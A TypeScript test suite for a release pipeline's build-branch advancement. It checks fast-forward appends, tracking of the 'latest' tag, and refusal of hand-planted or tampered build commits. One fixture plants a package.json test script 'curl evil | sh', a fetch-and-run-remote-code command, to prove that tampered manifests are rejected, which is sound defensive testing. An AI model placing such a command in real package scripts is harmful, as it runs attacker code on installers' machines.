/**
 * advanceBuild against the fixture repositories: the build chain only advances, latest follows the newest main
 * source, and every interleaving with a rival run or a release-hook backfill lands where the topology says.
 */

import { describe, expect, setDefaultTimeout, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import {
  advanceBuild,
  PREPARATION_SCRIPTS,
  packageRelease,
  verifyPublishedRefs,
} from "../../.github/scripts/release-pipeline.js";
import {
  appendedSha,
  appendOf,
  BOT_IDENTITY,
  buildTip,
  builtFiles,
  checkoutOf,
  clone,
  commitAll,
  FIXTURE_IDENTITY,
  type Fixture,
  git,
  identityOf,
  installReleasePipelineFixture,
  latestOf,
  latestTag,
  localIdentity,
  manifestJson,
  PACKAGED_DIFF,
  PERMANENT,
  type PushPlan,
  parentOf,
  pushGreenCommit,
  remoteRef,
  rivalChainCommit,
  STRIPPED_SCRIPTS,
  seedFixture,
  shallowChecker,
  shouldStripManifest,
  sourceTrailer,
  stageBuild,
  stripPrepare,
  stripWorkflows,
  TAG_PUSH,
  treePaths,
  withPushPlans,
  write,
  writeBuild,
} from "./release-pipeline-fixture.js";

// Dozens of git spawns per test time out bun's 5s default under parallel machine load.
setDefaultTimeout(30_000);
installReleasePipelineFixture();

describe("advanceBuild", () => {
  const advanced = (tip: string): string =>
    `refs/heads/build: advanced to ${tip}; refs/tags/latest: moved to ${tip}`;

  test("the first advance creates build as the green commit's packaged commit, a root, and tags it latest; a rerun verifies both", () => {
    const fx = seedFixture();
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({
        cwd: fx.work,
        sourceSha: fx.mergeSha,
        runUrl: "https://example.invalid/actions/runs/7",
      });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(pushes).toEqual([appendOf(tip), latestOf("", tip)]);
    expect(latestTag(fx)).toBe(tip);
    expect(parentOf(fx.origin, tip)).toBe("");
    expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, tip)).toBe(PACKAGED_DIFF);
    expect(git(fx.origin, "show", `${tip}:lib/index.js`)).toBe("packaged-bundle-bytes-1");
    expect(git(fx.origin, "show", `${tip}:lib/pkg/index.js`)).toBe(
      "library-packaged-bundle-bytes-1",
    );
    expect(git(fx.origin, "show", `${tip}:lib/pkg/index.d.ts`)).toBe(
      "types-packaged-bundle-bytes-1",
    );
    const body = git(fx.origin, "log", "-1", "--format=%B", tip);
    expect(body).toContain(`build: main at ${git(fx.origin, "rev-parse", "--short", fx.mergeSha)}`);
    expect(body).toContain("Workflow-run: https://example.invalid/actions/runs/7");
    expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
    expect(identityOf(fx.origin, tip)).toBe(BOT_IDENTITY);
    expect(localIdentity(fx.work)).toBe(FIXTURE_IDENTITY);
    expect(git(fx.work, "rev-parse", "HEAD")).toBe(fx.mergeSha);
    expect(git(fx.work, "status", "--porcelain")).toBe("");

    const rerun = checkoutOf(fx, "build-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let again: ReturnType<typeof advanceBuild> | undefined;
    const rerunPushes = withPushPlans(fx, [], () => {
      again = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
    });
    expect(again).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest already at ${tip}`,
    });
    expect(rerunPushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a newer green commit appends a fast-forward child of the previous tip and latest follows", () => {
    const fx = seedFixture();
    const first = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    // The stale checkout is cloned BEFORE the newer commit exists: it must learn that commit from origin to see build as already past.
    const stale = checkoutOf(fx, "build-stale", fx.mergeSha, "packaged-bundle-bytes-1\n");
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    let second: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      second = advanceBuild({ cwd: next.dir, sourceSha: next.sha });
    });
    const tip = buildTip(fx);
    expect(second).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(pushes).toEqual([appendOf(tip), latestOf(first, tip)]);
    expect(latestTag(fx)).toBe(tip);
    expect(git(fx.origin, "rev-parse", `${tip}^`)).toBe(first);
    expect(git(fx.origin, "diff", "--name-only", next.sha, tip)).toBe(PACKAGED_DIFF);
    expect(git(fx.origin, "show", `${tip}:lib/index.js`)).toBe("packaged-bundle-bytes-2");
    expect(git(fx.origin, "show", `${tip}:src/marker.ts`)).toBe(
      'export const marker = "second-green";',
    );
    expect(sourceTrailer(fx.origin, tip)).toBe(next.sha);

    let staleResult: ReturnType<typeof advanceBuild> | undefined;
    const stalePushes = withPushPlans(fx, [], () => {
      staleResult = advanceBuild({ cwd: stale, sourceSha: fx.mergeSha });
    });
    expect(staleResult).toEqual({
      changed: false,
      buildSha: first,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${first}; refs/tags/latest already at ${tip}`,
    });
    expect(stalePushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a chain commit carries the source without its workflows, and a workflow change between two appends pushes cleanly", () => {
    const fx = seedFixture();
    const first = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    const paths = treePaths(fx.origin, first);
    expect(paths.filter((path) => path.startsWith(".github/workflows/"))).toEqual([]);
    expect(paths).toContain(".github/dependabot.yml");
    expect(paths).toContain("lib/index.js");
    expect(paths).toContain("lib/pkg/index.js");
    // GitHub judges a token's workflow-push refusal per push, so a workflow change between two appends is the shape the fixture can pin: the chain
    // commit carries neither workflow.
    const dir = clone(fx.root, fx.origin, "workflow-change");
    write(dir, ".github/workflows/ci.yml", "name: ci\non: [push, pull_request]\njobs: {}\n");
    write(dir, ".github/workflows/nightly.yml", "name: nightly\non: schedule\njobs: {}\n");
    const sha = commitAll(dir, "ci: change the workflows");
    git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    writeBuild(dir, "packaged-bundle-bytes-2\n");
    const second = advanceBuild({ cwd: dir, sourceSha: sha });
    expect(second.changed).toBe(true);
    expect(parentOf(fx.origin, second.buildSha)).toBe(first);
    expect(
      treePaths(fx.origin, second.buildSha).filter((path) => path.startsWith(".github/workflows/")),
    ).toEqual([]);
    expect(git(fx.origin, "diff", "--name-only", sha, second.buildSha)).toBe(
      ".github/workflows/ci.yml\n.github/workflows/nightly.yml\nlib/index.js\nlib/pkg/index.d.ts\nlib/pkg/index.js\npackage.json",
    );
  });

  test("a stale rerun of a commit build skipped finds build already past it and appends nothing", () => {
    const fx = seedFixture();
    advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    const skipped = pushGreenCommit(fx, "skipped-green", "packaged-bundle-bytes-2\n");
    const third = pushGreenCommit(fx, "third-green", "packaged-bundle-bytes-3\n");
    const tip = advanceBuild({ cwd: third.dir, sourceSha: third.sha }).buildSha;
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: skipped.dir, sourceSha: skipped.sha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build is already past ${skipped.sha} (built from ${third.sha}); the newer run advanced it; refs/tags/latest already at ${tip}`,
    });
    expect(pushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
  });

  function plantLatest(
    fx: Fixture,
    name: string,
    source: string,
    parent: string,
    files: Record<string, string>,
  ): string {
    const planter = clone(fx.root, fx.origin, name);
    git(planter, "checkout", "--quiet", source);
    stripWorkflows(planter);
    writeBuild(planter, "planted\n");
    stageBuild(planter);
    stripPrepare(planter);
    for (const [file, content] of Object.entries(files)) {
      write(planter, file, content);
      git(planter, "add", "-f", file);
    }
    const planted = git(
      planter,
      "commit-tree",
      git(planter, "write-tree"),
      "-p",
      parent,
      "-m",
      "build: by hand",
      "-m",
      `Source: ${source}`,
    );
    git(planter, "push", "--quiet", "--force", "origin", `${planted}:refs/tags/latest`);
    return planted;
  }

  const plantedNewer: [string, (fx: Fixture, tip: string, newer: string) => string][] = [
    [
      "a tampered tree",
      (fx, tip, newer) =>
        plantLatest(fx, "latest-newer-tampered", newer, tip, {
          "action.yml": "name: tampered\n",
        }),
    ],
    [
      "a pure package that is not on build",
      (fx, _tip, newer) => plantLatest(fx, "latest-newer-detached", newer, newer, {}),
    ],
  ];
  test.each(plantedNewer)(
    "a hand-planted latest naming a newer source with %s is replaced by this run's target",
    (_name, plant) => {
      const fx = seedFixture();
      const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
      // The newer main commit is not packaged yet, so its Source trailer alone would read as "newer, leave it".
      const newer = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const planted = plant(fx, tip, newer.sha);
      expect(latestTag(fx)).toBe(planted);
      const rerun = checkoutOf(fx, "latest-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
      });
      expect(result).toEqual({
        changed: false,
        buildSha: tip,
        latestSha: tip,
        reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest: moved to ${tip}`,
      });
      expect(pushes).toEqual([latestOf(planted, tip)]);
      expect(latestTag(fx)).toBe(tip);
    },
  );

  test("a latest fifty-one chain commits behind the tip is left alone", () => {
    const fx = seedFixture();
    const kept = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    // Rolling latest back to the older tip would be wrong however long the backfill chain.
    const filler = clone(fx.root, fx.origin, "latest-filler");
    git(filler, "checkout", "--quiet", fx.seedSha);
    stripWorkflows(filler);
    writeBuild(filler, "packaged-bundle-bytes-0\n");
    stageBuild(filler);
    stripPrepare(filler);
    const tree = git(filler, "write-tree");
    let tip = kept;
    for (let n = 0; n < 51; n++) {
      tip = git(
        filler,
        "commit-tree",
        tree,
        "-p",
        tip,
        "-m",
        `build: backfill ${n}`,
        "-m",
        `Source: ${fx.seedSha}`,
      );
    }
    git(filler, "push", "--quiet", "origin", `${tip}:refs/heads/build`);
    const rerun = checkoutOf(fx, "latest-deep", fx.seedSha, "packaged-bundle-bytes-0\n");
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: rerun, sourceSha: fx.seedSha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: kept,
      reason: `refs/heads/build already packages ${fx.seedSha} at ${tip}; refs/tags/latest already at ${kept}`,
    });
    expect(pushes).toEqual([]);
    expect(latestTag(fx)).toBe(kept);
  });

  test("an annotated latest on a valid newer chain commit is left alone by a stale rerun", () => {
    const fx = seedFixture();
    advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    const newer = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
    // latest is re-made by hand as an ANNOTATED tag (its id is a tag object) at the newer commit.
    const backfill = rivalChainCommit(
      fx,
      "seed-backfill",
      fx.seedSha,
      newer,
      "packaged-bundle-bytes-0\n",
    );
    git(backfill.from, "push", "--quiet", "origin", `${backfill.sha}:refs/heads/build`);
    git(backfill.from, "tag", "-a", "-f", "-m", "by hand", "latest", newer);
    git(backfill.from, "push", "--quiet", "--force", "origin", "refs/tags/latest");
    const tagObject = git(fx.origin, "rev-parse", "refs/tags/latest");
    expect(tagObject).not.toBe(newer);
    expect(latestTag(fx)).toBe(newer);
    const rerun = checkoutOf(fx, "seed-rerun", fx.seedSha, "packaged-bundle-bytes-0\n");
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: rerun, sourceSha: fx.seedSha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: backfill.sha,
      latestSha: newer,
      reason: `refs/heads/build already packages ${fx.seedSha} at ${backfill.sha}; refs/tags/latest already at ${newer}`,
    });
    expect(pushes).toEqual([]);
    expect(git(fx.origin, "rev-parse", "refs/tags/latest")).toBe(tagObject);
  });

  test("a hand-moved latest is brought back to the tip by the next run", () => {
    const fx = seedFixture();
    const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    git(fx.work, "push", "--quiet", "--force", "origin", `${fx.seedSha}:refs/tags/latest`);
    const rerun = checkoutOf(fx, "latest-heal", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest: moved to ${tip}`,
    });
    expect(pushes).toEqual([latestOf(fx.seedSha, tip)]);
    expect(latestTag(fx)).toBe(tip);
  });

  function plantBuild(
    fx: Fixture,
    name: string,
    from: string,
    message: string[],
    files: Record<string, string | { linkTo: string }> = builtFiles("planted\n"),
  ): string {
    const planter = clone(fx.root, fx.origin, name);
    git(planter, "checkout", "--quiet", from);
    stripWorkflows(planter);
    for (const [file, content] of Object.entries(files)) {
      if (typeof content === "string") {
        write(planter, file, content);
      } else {
        mkdirSync(dirname(join(planter, file)), { recursive: true });
        symlinkSync(content.linkTo, join(planter, file));
      }
      git(planter, "add", "-f", file);
    }
    if (shouldStripManifest(files)) {
      stripPrepare(planter);
    }
    const paragraphs = message.flatMap((paragraph) => ["-m", paragraph]);
    git(planter, "commit", "--quiet", "--allow-empty", ...paragraphs);
    git(planter, "push", "--quiet", "--force", "origin", "HEAD:refs/heads/build");
    return git(planter, "rev-parse", "HEAD");
  }

  function plantForeignBuild(fx: Fixture, from: string): { sideSha: string; planted: string } {
    const side = clone(fx.root, fx.origin, "build-side");
    git(side, "checkout", "--quiet", "-b", "side", from);
    write(side, "src/marker.ts", "export const marker = 'side';\n");
    const sideSha = commitAll(side, "feat: never merged");
    git(side, "push", "--quiet", "origin", "HEAD:refs/heads/side");
    const planted = plantBuild(fx, "build-foreign", sideSha, [
      "build: by hand",
      `Source: ${sideSha}`,
    ]);
    return { sideSha, planted };
  }

  const byHand =
    "refusing to build on a build branch this pipeline did not mint - inspect it by hand.";
  const foreign = (tip: string, source: string): string =>
    `refs/heads/build is at ${tip}, built from ${source}, which is not on main's history; refusing to append to a build branch this pipeline did not advance - inspect it by hand.`;

  function rebuiltTree(fx: Fixture, name: string, source: string): string {
    const rebuild = clone(fx.root, fx.origin, name);
    git(rebuild, "checkout", "--quiet", source);
    stripWorkflows(rebuild);
    writeBuild(rebuild, "planted\n");
    stageBuild(rebuild);
    stripPrepare(rebuild);
    return git(rebuild, "write-tree");
  }

  function notAPackage(
    fx: Fixture,
    where: "is at" | "holds",
    planted: string,
    source: string,
    changed: string,
  ): Error {
    const actual = git(fx.origin, "rev-parse", `${planted}^{tree}`);
    const expected = rebuiltTree(fx, `rebuilt-${planted.slice(0, 8)}`, source);
    return new Error(
      `refs/heads/build ${where} ${planted}, which names ${source} as its source but is not ` +
        `${source} plus lib/index.js and lib/pkg/, minus package.json's preparation scripts, and the removal of .github/workflows/ alone: its tree is ` +
        `${actual}, the rebuilt one is ${expected} (paths beyond those changed relative to ` +
        `${source}: ${changed}); ${byHand}`,
    );
  }

  /** A tip with an EMPTY subtree at `empty/`, which a path diff cannot list. */
  function plantEmptySubtreeBuild(fx: Fixture, from: string): string {
    const planter = clone(fx.root, fx.origin, "build-empty-subtree");
    git(planter, "checkout", "--quiet", from);
    stripWorkflows(planter);
    writeBuild(planter, "planted\n");
    stageBuild(planter);
    stripPrepare(planter);
    const emptyTree = execFileSync("git", ["hash-object", "-w", "-t", "tree", "--stdin"], {
      cwd: planter,
      input: "",
      encoding: "utf8",
    }).trim();
    const entries = `${git(planter, "ls-tree", git(planter, "write-tree"))}\n040000 tree ${emptyTree}\tempty\n`;
    const tree = execFileSync("git", ["mktree"], {
      cwd: planter,
      input: entries,
      encoding: "utf8",
    }).trim();
    const planted = git(
      planter,
      "commit-tree",
      tree,
      "-p",
      from,
      "-m",
      "build: by hand",
      "-m",
      `Source: ${from}`,
    );
    git(planter, "push", "--quiet", "--force", "origin", `${planted}:refs/heads/build`);
    return planted;
  }

  /** Plants a build tip the advance from fx.work (at the merge commit) must refuse; returns the tip and the exact or matching error. */
  type Refusal = (fx: Fixture) => { planted: string; error: RegExp | Error };
  const refused: [string, Refusal][] = [
    [
      "built from a commit off main's history that this checkout knows",
      (fx) => {
        const { sideSha, planted } = plantForeignBuild(fx, fx.seedSha);
        // Known locally, so the verdict is merge-base's, not the unknown-sha screen.
        git(fx.work, "fetch", "--quiet", "origin", "refs/heads/side");
        return { planted, error: new Error(foreign(planted, sideSha)) };
      },
    ],
    [
      "built from a commit this checkout has never seen",
      (fx) => {
        const { sideSha, planted } = plantForeignBuild(fx, fx.seedSha);
        return { planted, error: new Error(foreign(planted, sideSha)) };
      },
    ],
    [
      "built from a descendant of this commit that never reached main",
      (fx) => {
        // Descends from main's head, so ancestry alone would read it as a newer run's work; only its absence from main tells it apart.
        const { sideSha, planted } = plantForeignBuild(fx, fx.mergeSha);
        git(fx.work, "fetch", "--quiet", "origin", "refs/heads/side");
        return { planted, error: new Error(foreign(planted, sideSha)) };
      },
    ],
    [
      "carrying no Source trailer",
      (fx) => {
        const planted = plantBuild(fx, "build-untrailed", fx.mergeSha, ["build: by hand"]);
        return {
          planted,
          error: new Error(
            `refs/heads/build is at ${planted}, which carries no Source trailer, so this pipeline did not mint it; ${byHand}`,
          ),
        };
      },
    ],
    [
      "naming this source but changing more than the build outputs",
      (fx) => {
        const planted = plantBuild(
          fx,
          "build-extra",
          fx.mergeSha,
          ["build: by hand", `Source: ${fx.mergeSha}`],
          { ...builtFiles("planted\n"), "src/marker.ts": "export const marker = 666;\n" },
        );
        return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "src/marker.ts") };
      },
    ],
    [
      "naming this source with build outputs that are not this checkout's build",
      (fx) => {
        const genuine = checkoutOf(fx, "build-genuine", fx.mergeSha, "packaged-bundle-bytes-1\n");
        const built = advanceBuild({ cwd: genuine, sourceSha: fx.mergeSha }).buildSha;
        const tree = git(fx.origin, "rev-parse", `${built}^{tree}`);
        const planted = plantBuild(fx, "build-rebuilt", fx.mergeSha, [
          "build: by hand",
          `Source: ${fx.mergeSha}`,
        ]);
        const plantedTree = git(fx.origin, "rev-parse", `${planted}^{tree}`);
        return {
          planted,
          error: new Error(
            `refs/heads/build holds ${planted}, which names ${fx.mergeSha} as its source but ` +
              `its tree ${plantedTree} is not the tree ${tree} this checkout's build of ` +
              `${fx.mergeSha} packages, so the two differ under lib/index.js and lib/pkg/ (bytes, ` +
              "file modes, or the files under lib/pkg/): either the commit was not built from this " +
              "source or the build is not reproducible, and the Source trailer cannot tell those " +
              "apart. Diff the two trees by hand; a hand-pushed commit is left for the next green " +
              "push to bury (the ruleset on build forbids moving it back), a build that differs " +
              "between runs is fixed before build can be trusted.",
          ),
        };
      },
    ],
    [
      "naming a newer main commit but lacking its bundle",
      (fx) => {
        // A stale rerun would read this as "already past"; the tip's own tree still has to be a package of the source it names.
        const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
        const planted = plantBuild(
          fx,
          "build-unbundled",
          next.sha,
          ["build: by hand", `Source: ${next.sha}`],
          {},
        );
        return {
          planted,
          error: new Error(
            `${planted} does not carry a non-empty regular-file lib/index.js (no entry); refusing to point a consumable ref at an unpackaged commit.`,
          ),
        };
      },
    ],
    [
      "naming a newer main commit but carrying the bundle as a symlink",
      (fx) => {
        // A symlink at the bundle's path has a size (its target text), so a size probe alone would bless a tip consumers cannot run.
        const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
        const planted = plantBuild(
          fx,
          "build-symlinked",
          next.sha,
          ["build: by hand", `Source: ${next.sha}`],
          { "lib/index.js": { linkTo: "../src/marker.ts" } },
        );
        const entry = git(fx.origin, "ls-tree", "-l", planted, "--", "lib/index.js").split("\t")[0];
        return {
          planted,
          error: new Error(
            `${planted} does not carry a non-empty regular-file lib/index.js (entry ${entry}); refusing to point a consumable ref at an unpackaged commit.`,
          ),
        };
      },
    ],
    [
      "naming a newer main commit and carrying an empty subtree beyond the bundle",
      (fx) => {
        // Invisible to a path diff (no path lives in an empty tree), so only tree identity catches it.
        const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
        const planted = plantEmptySubtreeBuild(fx, next.sha);
        return {
          planted,
          error: notAPackage(
            fx,
            "is at",
            planted,
            next.sha,
            "none (an entry a path diff cannot list, such as an empty subtree)",
          ),
        };
      },
    ],
    [
      "naming this source with a package.json changed beyond its preparation scripts",
      (fx) => {
        const planted = plantBuild(
          fx,
          "build-manifest",
          fx.mergeSha,
          ["build: by hand", `Source: ${fx.mergeSha}`],
          {
            ...builtFiles("planted\n"),
            "package.json": manifestJson("2.1.0", { test: "curl evil | sh" }),
          },
        );
        return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "package.json") };
      },
    ],
    [
      "carrying the library build beside a package.json that kept its preparation scripts",
      (fx) => {
        // Only bundle-only commits predate the strip; a commit with lib/pkg/ was minted after it and is held to it.
        const planted = plantBuild(
          fx,
          "build-prepare-kept",
          fx.mergeSha,
          ["build: by hand", `Source: ${fx.mergeSha}`],
          { ...builtFiles("planted\n"), "package.json": manifestJson("2.1.0") },
        );
        return {
          planted,
          error: notAPackage(
            fx,
            "holds",
            planted,
            fx.mergeSha,
            "package.json (preparation scripts kept)",
          ),
        };
      },
    ],
    [
      "naming an older main commit and carrying a file beyond the build outputs",
      (fx) => {
        // The append path: an older source is a valid parent only when its tip is a pure package, never with a foreign file riding along.
        const planted = plantBuild(
          fx,
          "build-older-extra",
          fx.seedSha,
          ["build: by hand", `Source: ${fx.seedSha}`],
          { ...builtFiles("planted\n"), "src/marker.ts": "export const marker = 666;\n" },
        );
        return { planted, error: notAPackage(fx, "is at", planted, fx.seedSha, "src/marker.ts") };
      },
    ],
  ];
  test.each(refused)("a build tip %s stops the advance and stays put", (_name, plant) => {
    const fx = seedFixture();
    const { planted, error } = plant(fx);
    const latestBefore = remoteRef(fx, "refs/tags/latest");
    expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(error);
    expect(buildTip(fx)).toBe(planted);
    expect(remoteRef(fx, "refs/tags/latest")).toBe(latestBefore);
  });

  test("the preparation triggers are the six pacote reads before it prepares a git dependency", () => {
    // Pinned as a literal: the fixture derives from the exported list, so a name dropped there would vanish
    // from the fixture too and the manifest test below could not see it go.
    expect(PREPARATION_SCRIPTS).toEqual([
      "prepare",
      "prepack",
      "build",
      "preinstall",
      "install",
      "postinstall",
    ]);
  });

  test("a chain commit's package.json is the source's without its preparation scripts, and a rerun holds it there", () => {
    const fx = seedFixture();
    const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    expect(git(fx.origin, "show", `${tip}:package.json`)).toBe(
      manifestJson("2.1.0", STRIPPED_SCRIPTS).trimEnd(),
    );
    expect(git(fx.origin, "show", `${fx.mergeSha}:package.json`)).toBe(
      manifestJson("2.1.0").trimEnd(),
    );
    const rerun = checkoutOf(fx, "manifest-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let again: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      again = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
    });
    expect(again).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest already at ${tip}`,
    });
    expect(pushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test.each(["lib/index.js", "lib/pkg/index.js"])("an empty %s never reaches build", (file) => {
    const fx = seedFixture();
    write(fx.work, file, "");
    expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(
      `does not carry a non-empty regular-file ${file}`,
    );
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
    expect(remoteRef(fx, "refs/tags/latest")).toBe("");
  });

  test("a build tip minted before the library rode along is built on, and the child carries it", () => {
    const fx = seedFixture();
    // The chain as the pipeline left it before lib/pkg/ was packaged: the
    // seed's tree minus workflows plus the bundle alone, latest on it.
    const legacy = plantBuild(
      fx,
      "build-legacy",
      fx.seedSha,
      ["build: by hand", `Source: ${fx.seedSha}`],
      {
        "lib/index.js": "packaged-bundle-bytes-0\n",
      },
    );
    git(fx.work, "fetch", "--quiet", "origin", "refs/heads/build");
    git(fx.work, "push", "--quiet", "--force", "origin", `${legacy}:refs/tags/latest`);
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(pushes).toEqual([appendOf(tip), latestOf(legacy, tip)]);
    expect(parentOf(fx.origin, tip)).toBe(legacy);
    expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, tip)).toBe(PACKAGED_DIFF);
    // A stale rerun of the legacy source's run under this pipeline builds
    // lib/pkg/ the chain commit lacks: it stops rather than rewrite the chain.
    const stale = checkoutOf(fx, "legacy-rerun", fx.seedSha, "packaged-bundle-bytes-0\n");
    expect(() => advanceBuild({ cwd: stale, sourceSha: fx.seedSha })).toThrow(
      new RegExp(
        `refs/heads/build holds ${legacy}, which names ${fx.seedSha} as its source but its tree [0-9a-f]{40} is not the tree [0-9a-f]{40} this checkout's build of ${fx.seedSha} packages, so the two differ under lib/index.js and lib/pkg/`,
      ),
    );
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a release tag on a chain commit without the library build fails the confirmation, whatever its bundle", () => {
    const fx = seedFixture();
    // A legacy-shaped chain commit for the merge commit: right source, right
    // bundle bytes, no lib/pkg/; build's tip, tagged as the release.
    const planted = plantBuild(
      fx,
      "build-legacy-release",
      fx.mergeSha,
      ["build: by hand", `Source: ${fx.mergeSha}`],
      {
        "lib/index.js": "packaged-bundle-bytes-1\n",
      },
    );
    git(fx.work, "fetch", "--quiet", "origin", "refs/heads/build");
    git(
      fx.work,
      "push",
      "--quiet",
      "origin",
      `${planted}:refs/tags/v2.1.0`,
      `${planted}:refs/tags/v2`,
    );
    expect(() =>
      verifyPublishedRefs({
        cwd: shallowChecker(fx, "verify-legacy"),
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }),
    ).toThrow(
      `${planted} does not carry a non-empty regular-file lib/pkg/index.js (no entry); refusing to point a consumable ref at an unpackaged commit.`,
    );
    // The package rerun holds the tag to this checkout's whole build too.
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /carries \[lib\/index\.js\] under lib\/index\.js and lib\/pkg\/, while this build of [0-9a-f]{40} produced \[lib\/index\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\]/,
    );
  });

  test("a shallow checkout is refused before any verdict", () => {
    const fx = seedFixture();
    const dir = join(fx.root, "build-shallow");
    execFileSync("git", ["clone", "--quiet", "--depth", "1", `file://${fx.origin}`, dir]);
    writeBuild(dir, "packaged-bundle-bytes-1\n");
    expect(() => advanceBuild({ cwd: dir, sourceSha: fx.mergeSha })).toThrow(
      /needs the full history.*shallow/,
    );
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });

  /** `count` packaged commits of the seed chained from a root, unpushed: the plans land one ahead of each of this run's pushes. */
  function competitors(
    fx: Fixture,
    count: number,
  ): { from: string; plans: PushPlan[]; shas: string[]; first: string; last: string } {
    const from = clone(fx.root, fx.origin, "build-competitor");
    git(from, "checkout", "--quiet", fx.seedSha);
    stripWorkflows(from);
    writeBuild(from, "competitor-bundle\n");
    stageBuild(from);
    stripPrepare(from);
    const tree = git(from, "write-tree");
    const shas: string[] = [];
    let first = "";
    let last = "";
    for (let n = 1; n <= count; n++) {
      last = git(
        from,
        "commit-tree",
        tree,
        ...(last === "" ? [] : ["-p", last]),
        "-m",
        `build: competitor ${n}`,
        "-m",
        `Source: ${fx.seedSha}`,
      );
      first = first === "" ? last : first;
      shas.push(last);
    }
    return {
      from,
      plans: shas.map((sha) => ({ competitor: { from, sha, ref: "refs/heads/build" } })),
      shas,
      first,
      last,
    };
  }

  function expectRetriedOnto(
    fx: Fixture,
    before: string,
    rivalTip: string,
    result: ReturnType<typeof advanceBuild> | undefined,
    pushes: string[][],
  ): void {
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(latestTag(fx)).toBe(tip);
    expect(git(fx.origin, "rev-parse", `${tip}^`)).toBe(rivalTip);
    expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
    const rejected = appendedSha(pushes[0] ?? []);
    expect(pushes).toEqual([appendOf(rejected), appendOf(tip), latestOf("", tip)]);
    expect(parentOf(fx.work, rejected)).toBe(before);
  }

